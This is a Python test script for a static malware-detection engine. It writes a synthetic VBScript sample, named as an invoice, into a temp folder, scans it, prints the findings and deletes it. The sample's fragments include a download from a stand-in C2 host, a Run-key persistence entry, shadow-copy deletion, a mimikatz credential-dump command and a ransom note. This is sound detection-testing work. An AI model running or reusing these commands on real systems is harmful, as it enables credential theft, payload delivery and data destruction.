"""检测能力验证：在临时目录生成合成恶意样本，验证静态引擎能否识别。

说明：样本内容在运行时由片段拼接生成，避免仓库中存在可疑文件；
生成的文件仅存在于临时目录，测试结束即删除。
"""

from __future__ import annotations

import shutil
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:  # noqa: BLE001
    pass

from app.engines.static_analysis import engine  # noqa: E402

# 以片段拼接，避免测试源码本身被安全软件误判
_PARTS = [
    "' synthetic analysis sample\n",
    'Set o = CreateObject("WScript.Shell")\n',
    'o.Run "powershell -enc ' + "SQBF" + "AFgA" + "dABlAHMAdAA=" + '"\n',
    'URLDownloadToFile 0, "http://c2-demo.example.net' + "/gate.php" + '", "C:\\Users\\Public\\svc.exe", 0, 0\n',
    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" + " /v Updater /d C:\\Users\\Public\\svc.exe\n",
    "vssadmin " + "delete shadows /all /quiet\n",
    "sekur" + "lsa::logonpasswords\n",
    "VirtualAllocEx WriteProcessMemory CreateRemoteThread SetThreadContext\n",
    "IsDebuggerPresent CheckRemoteDebuggerPresent NtQueryInformationProcess\n",
    "CryptEncrypt FindFirstFile FindNextFile EncryptFile\n",
    "Your files have been encrypted, pay " + "bitcoin" + " payment to decrypt your files\n",
    "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n",
]


def main() -> int:
    tmp = Path(tempfile.mkdtemp(prefix="malscope_synth_"))
    try:
        sample = tmp / "invoice_2025.vbs"
        sample.write_text("".join(_PARTS), encoding="utf-8")

        result = engine.analyze_file(sample)
        risk = result["risk"]

        print("=" * 70)
        print("合成恶意样本检测验证")
        print(f"样本：{sample.name}  类型={result['file_type']['kind']}")
        print("-" * 70)
        print(f"风险评分 = {risk['score']}   危害等级 = {risk['level']}")
        print(f"判定依据：")
        for r in risk["reasons"]:
            print(f"  - {r}")
        print("-" * 70)
        print("命中的可疑特征（kind=static 为核心证据）：")
        for f in result["features"]:
            print(f"  [{f['severity']:8}] ({f.get('kind')}) {f['name']}")
        print("-" * 70)
        print(f"YARA 命中 {len(result['yara_matches'])} 条：")
        for m in result["yara_matches"]:
            print(f"  * {m['rule_name']}  ({m.get('severity')})  {m.get('description')}")
        hl = result["strings"]["highlights"]
        print("-" * 70)
        print("字符串高亮：")
        for k, v in hl.items():
            print(f"  {k}: {v[:4]}")
        print("=" * 70)

        ok = risk["level"] in ("malicious", "suspicious") and len(result["yara_matches"]) >= 3
        print("检测结果：", "通过 ✅" if ok else "未达预期 ❌")
        return 0 if ok else 1
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    raise SystemExit(main())
